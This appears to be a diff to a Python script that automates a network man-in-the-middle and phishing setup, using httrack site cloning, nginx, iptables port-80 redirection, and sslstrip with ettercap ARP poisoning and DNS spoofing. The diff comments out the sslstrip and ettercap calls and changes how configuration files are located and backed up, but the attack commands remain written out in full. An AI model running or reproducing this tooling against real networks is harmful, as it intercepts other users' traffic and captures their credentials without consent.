@@ -11,6 +11,10 @@ EXECUTABLES = ['nginx', 'ettercap', 'locate', 'httrack', 'sslstrip']
 def find_file(file_name):
     output = subprocess.Popen(['locate',file_name], stdout=subprocess.PIPE).communicate()[0]
     output_list = output.decode().split('\n')
+    if file_name == 'nginx.conf' and '/etc/nginx/nginx.conf' in output_list:
+        return '/etc/nginx/nginx.conf'
+    if file_name == 'etter.dns' and '/etc/ettercap/etter.dns' in output_list:
+        return '/etc/ettercap/etter.dns'
     found = False
     conf_path = ""
     index = 0
@@ -35,8 +39,10 @@ def update_nginx_conf(conf_path):
             fd_data = fd.readlines()
         fd_index = find_line(fd_data)
     except FileNotFoundError:
-        fd_index = -1
-        fd_path = input('Enter absolute root path for nginx server: ')
+        subprocess.call(["cp",conf_path,conf_path+".default"])
+        with open(conf_path + '.default', 'r') as fd:
+            fd_data = fd.readlines()
+        fd_index = find_line(fd_data)
     with open(conf_path, 'r') as f:
         f_data = f.readlines()
     if fd_index != -1:
@@ -107,8 +113,8 @@ def call_httrack(default_path):
     subprocess.call(["iptables","--flush","-t","nat"])
     subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
         "80","-j","REDIRECT","--to-port","6666"])
-    subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
-    subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
+    # subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
+    # subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","//","//","-i",sys.argv[2]])
 
 def check_executables():
     for e in EXECUTABLES:
